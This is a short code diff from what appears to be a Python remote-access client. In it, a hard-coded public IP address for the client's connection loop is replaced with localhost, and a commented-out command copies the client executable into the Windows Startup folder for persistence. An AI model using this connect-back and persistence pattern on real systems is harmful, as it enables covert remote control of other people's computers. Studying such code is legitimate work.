@@ -125,4 +125,4 @@ if __name__ == '__main__':
 	'''os.popen('copy "client.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"')'''
 	s = socket.socket()
 	while True:
-		StartConnect("37.147.142.138",6201)
+		StartConnect("localhost",6201)
